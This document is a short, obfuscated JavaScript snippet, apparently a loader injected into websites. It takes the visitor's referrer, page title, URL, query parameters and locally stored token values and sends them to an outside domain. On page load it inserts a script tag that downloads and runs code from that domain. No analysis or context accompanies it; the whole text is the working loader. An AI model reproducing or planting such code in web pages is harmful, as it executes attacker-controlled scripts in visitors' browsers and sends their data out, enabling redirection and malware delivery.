(function() {
    var name = '_JpgZhHhMdmYp5sN6';
    if (!window._JpgZhHhMdmYp5sN6) {
        window._JpgZhHhMdmYp5sN6 = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://mrgperu.org/w84smsyC',
        };
    }
    const _Y2Y1sQshVGDGvtgQ = localStorage.getItem('config');
    if (typeof _Y2Y1sQshVGDGvtgQ !== 'undefined' && _Y2Y1sQshVGDGvtgQ !== null) {
        var _JhM5V7sSTPF9sNHv = JSON.parse(_Y2Y1sQshVGDGvtgQ);
        var _bJ8bqbQT2PKTqDtX = Math.round(+new Date()/1000);
        if (_JhM5V7sSTPF9sNHv.created_at + window._JpgZhHhMdmYp5sN6.ttl < _bJ8bqbQT2PKTqDtX) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _bTy6Fs77ZqFwj2Xn = localStorage.getItem('subId');
    var _VVRM9gtNVPCJNfph = localStorage.getItem('token');
    var _vxmw6HNs27RVGZz8 = '?return=js.client';
        _vxmw6HNs27RVGZz8 += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _vxmw6HNs27RVGZz8 += '&se_referrer=' + encodeURIComponent(document.referrer);
        _vxmw6HNs27RVGZz8 += '&default_keyword=' + encodeURIComponent(document.title);
        _vxmw6HNs27RVGZz8 += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _vxmw6HNs27RVGZz8 += '&name=' + encodeURIComponent(name);
        _vxmw6HNs27RVGZz8 += '&host=' + encodeURIComponent(window._JpgZhHhMdmYp5sN6.R_PATH);
    if (typeof _bTy6Fs77ZqFwj2Xn !== 'undefined' && _bTy6Fs77ZqFwj2Xn && window._JpgZhHhMdmYp5sN6.unique) {
        _vxmw6HNs27RVGZz8 += '&sub_id=' + encodeURIComponent(_bTy6Fs77ZqFwj2Xn);
    }
    if (typeof _VVRM9gtNVPCJNfph !== 'undefined' && _VVRM9gtNVPCJNfph && window._JpgZhHhMdmYp5sN6.unique) {
        _vxmw6HNs27RVGZz8 += '&token=' + encodeURIComponent(_VVRM9gtNVPCJNfph);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._JpgZhHhMdmYp5sN6.R_PATH + _vxmw6HNs27RVGZz8;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
